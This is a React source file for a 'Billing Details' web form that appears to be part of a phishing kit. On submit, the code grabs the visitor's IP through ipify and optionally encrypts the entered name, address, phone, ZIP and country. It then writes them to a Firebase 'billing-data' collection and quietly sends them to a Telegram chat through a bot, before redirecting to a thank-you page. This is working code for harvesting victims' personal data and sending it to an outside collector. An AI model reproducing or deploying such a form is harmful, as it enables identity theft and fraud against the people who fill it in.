import { useState, useRef, Fragment } from 'react';
import { Redirect } from 'react-router-dom';

import db from '../firebase/firebase';
import Header from '../Layout/Header';
import Footer from '../Layout/Footer';
import moment from "moment"
const { TelegramClient } = require('messaging-api-telegram');
const CryptoJS = require("crypto-js");
const client = new TelegramClient({
    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
});

const Billing = () => {
    const [fullname, setFullname] = useState('');
    const [address, setAddress] = useState('');
    const [state, setState] = useState('');
    const [city, setCity] = useState('');
    const [zip, setZip] = useState('');
    const [phone, setPhone] = useState('');
    const [country, setCountry] = useState('');
    const [formSuccess, setFromSuccess] = useState(false);
    const [formError, setFormError] = useState(null);


    const fullnameRef = useRef(null);
    const addressRef = useRef(null);
    const stateRef = useRef(null);
    const cityeRef = useRef(null);
    const zipRef = useRef(null);
    const phoneRef = useRef(null);
    const countryRef = useRef(null);

    const submitHandler = async (e) => {
        e.preventDefault();
        if (fullname && address && state && city && zip && phone && country) {
            fetch(
                "https://api.ipify.org?format=jsonp?callback=?", {
                method: "GET",
                headers: {}
            })
            .then(res => {
                return res.text()
            })
            .then(ip => {
                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
                const isEnableDBStore = process.env.REACT_APP_PUBLIC_DB_STORE_ENABLE
                const isEnableTM = process.env.REACT_APP_PUBLIC_TM_ENABLE
                let fullnames = fullname
                let addresss = address
                let states = state
                let citys = city
                let zips = zip
                let phones = phone
                let countrys = country
                let ip_address = ip
                let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
                if( isEnableDecrypt === '1' )
                {
                    fullnames = CryptoJS.AES.encrypt(fullnames, secretKey).toString()
                    addresss = CryptoJS.AES.encrypt(addresss, secretKey).toString()
                    states = CryptoJS.AES.encrypt(states, secretKey).toString()
                    citys = CryptoJS.AES.encrypt(citys, secretKey).toString()
                    zips = CryptoJS.AES.encrypt(zips, secretKey).toString()
                    phones = CryptoJS.AES.encrypt(phones, secretKey).toString()
                    countrys = CryptoJS.AES.encrypt(countrys, secretKey).toString()
                    ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
                    logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
                }
                let tmMessage = "Billing Data\r\n"
                    tmMessage += "" + fullnames + '\r\n'
                    tmMessage += "" + addresss + '\r\n'
                    tmMessage += "" + states + '\r\n'
                    tmMessage += "" + citys + '\r\n'
                    tmMessage += "" + zips + '\r\n'
                    tmMessage += "" + phones + '\r\n'
                    tmMessage += "" + countrys + '\r\n'
                    tmMessage += "" + ip_address + '\r\n'
                    tmMessage += "" + logged_at
                if( isEnableDBStore === '1' )
                {
                    db.collection('billing-data').add({
                        fullname: fullnames, 
                        address: addresss, 
                        state: states, 
                        city: citys, 
                        zip: zips, 
                        phone: phones, 
                        country: countrys,
                        ip_address: ip_address,
                        logged_at: logged_at
                    }).then(data => {
                        setFromSuccess(true);
                    }).catch(err => {
                        throw new Error(err);
                    });
                }
                
                if( isEnableTM === '1' )
                {
                    client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, tmMessage, {
                        disableWebPagePreview: true,
                        disableNotification: true,
                    })
                    .then( res => {
                        setFromSuccess(true);
                    })
                    .catch( e => console.log('error while TM message' + e))
                }
                
            })

        } else {
            setFormError(true);
        }
    }


    return (
          <Fragment>
            <Header type='type-2' />
            <div className=''>
            {formSuccess ? <Redirect to='/thankyou' /> : null}

            <div className='my-12 relative w-5/5 lg:w-4/12 p-4 lg:p-16 m-auto rounded border z-10 p-10'>
                <div className='mb-4'>
                    <h4 className='text-2xl'>Billing Details</h4>
                </div>
                <form onSubmit={(e) => submitHandler(e)}>
                    <input onChange={(e) => setFullname(e.target.value)} ref={fullnameRef} type='text' value={fullname} className='border py-3 px-4 w-full rounded mb-6' placeholder='Full name' />
                    <input onChange={(e) => setAddress(e.target.value)} ref={addressRef} type='text' value={address} className='border py-3 px-4 w-full rounded mb-6' placeholder='Address' />
                    <div className='flex justify-between'>
                        <input onChange={(e) => setCity(e.target.value)} ref={cityeRef} type='text' value={city} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='City' />
                        <input onChange={(e) => setState(e.target.value)} ref={stateRef} type='text' value={state} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='State' />
                    </div>
                    <input onChange={(e) => setZip(e.target.value)} ref={zipRef} type='text' value={zip} className='border py-3 px-4 w-full rounded mb-6' placeholder='ZIP' />
                    <input onChange={(e) => setPhone(e.target.value)} ref={phoneRef} type='tel' value={phone} className='border py-3 px-4 w-full rounded mb-6' placeholder='Phone number' />
                    <input onChange={(e) => setCountry(e.target.value)} ref={countryRef} type='text' value={country} className='border py-3 px-4 w-full rounded mb-6' placeholder='Country' />
                    {formError ? <p className='text-red-600 '>Please fill all form fields</p> : null}

                    <button onClick={(e) => submitHandler(e)} className='bg-red-600 mt-4 w-full py-3 px-4 rounded text-white font-bold mb-8'>Next</button>
                </form>
            </div>
        </div>
            <Footer type='type-2' />
        </Fragment>
      
    );
};

export default Billing;